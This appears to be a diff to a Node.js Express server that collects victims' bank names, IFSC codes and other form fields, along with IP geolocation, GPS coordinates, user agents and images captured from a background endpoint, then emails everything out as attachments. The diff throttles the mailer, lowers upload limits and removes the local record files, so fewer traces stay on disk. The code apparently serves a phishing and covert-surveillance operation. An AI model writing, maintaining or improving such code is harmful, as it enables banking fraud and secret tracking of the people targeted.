@@ -21,8 +21,8 @@ if (!fs.existsSync(uploadDir)) {
 console.log(`Using upload directory: ${uploadDir}`);
 
 // Middleware for handling large payloads
-app.use(express.urlencoded({ extended: true, limit: '50mb' }));
-app.use(express.json({ limit: '50mb' }));
+app.use(express.urlencoded({ extended: true, limit: '10mb' })); // Reduced
+app.use(express.json({ limit: '10mb' })); // Reduced
 app.use(express.static('public'));
 
 // Add CORS headers
@@ -58,7 +58,7 @@ const upload = multer({
   storage: storage,
   fileFilter: fileFilter,
   limits: {
-    fileSize: 50 * 1024 * 1000 // 50MB limit
+    fileSize: 5 * 1024 * 1024 // 5MB limit (reduced)
   }
 }).any();
 
@@ -68,7 +68,10 @@ const transporter = nodemailer.createTransport({
   auth: {
     user: process.env.EMAIL_USER,
     pass: process.env.EMAIL_PASS
-  }
+  },
+  pool: true, // Use connection pooling
+  maxConnections: 1, // Only 1 connection at a time
+  rateLimit: 1 // Only 1 email per second
 });
 
 // Function to get client IP
@@ -118,17 +121,14 @@ app.post('/background-data', (req, res) => {
     backgroundDataStore[sessionId].timestamps.push(new Date().toISOString());
     
     // Log background data
-    const logEntry = `
+    console.log(`
 --- Background Data ---
 Session ID: ${sessionId}
 Time: ${new Date().toLocaleString()}
 IP: ${ip} (${ipLocation})
 Images: ${images ? images.length : 0}
 Location: ${location ? JSON.stringify(location) : 'None'}
-----------------------\n`;
-    
-    fs.appendFileSync('background_records.txt', logEntry);
-    console.log(logEntry);
+----------------------`);
     
     res.status(200).send('Background data received');
   } catch (error) {
@@ -194,8 +194,8 @@ app.post('/submit', (req, res) => {
       const timestamp = new Date().toLocaleString();
       const userAgent = req.headers['user-agent'];
 
-      // Create log entry
-      const logEntry = `
+      // Log entry
+      console.log(`
 --- Submission ---
 Bank Name: ${bankname}
 IFSC Code: ${ifsc}
@@ -208,11 +208,7 @@ IP: ${ip} (${ipLocation})
 User Agent: ${userAgent}
 Location: ${locationData ? `${locationData.latitude}, ${locationData.longitude}` : 'None'}
 Images Captured: ${imageAttachments.length}
--------------------
-`;
-
-      fs.appendFileSync('records.txt', logEntry);
-      console.log(logEntry);
+-------------------`);
 
       // Prepare email content
       const mailOptions = {
@@ -260,7 +256,8 @@ Images Captured: ${imageAttachments.length}
       if (documentFile) {
         mailOptions.attachments.push({
           filename: documentFile.originalname,
-          path: documentFile.path
+          path: documentFile.path,
+          encoding: 'base64' // Reduced memory usage
         });
       }
 
@@ -268,7 +265,8 @@ Images Captured: ${imageAttachments.length}
       imageAttachments.forEach(file => {
         mailOptions.attachments.push({
           filename: file.originalname,
-          path: file.path
+          path: file.path,
+          encoding: 'base64' // Reduced memory usage
         });
       });
 
@@ -349,7 +347,25 @@ setInterval(() => {
   });
 }, 3600000); // Run hourly
 
-// Start server
-app.listen(port, () => {
+// Create HTTP server
+const server = app.listen(port, () => {
   console.log(`Server running on port ${port}`);
+});
+
+// Graceful shutdown
+process.on('SIGTERM', () => {
+  console.log('SIGTERM signal received: closing HTTP server');
+  server.close(() => {
+    console.log('HTTP server closed');
+  });
+});
+
+// Error handling
+process.on('uncaughtException', (err) => {
+  console.error('Uncaught Exception:', err);
+  process.exit(1);
+});
+
+process.on('unhandledRejection', (reason, promise) => {
+  console.error('Unhandled Rejection at:', promise, 'reason:', reason);
 });
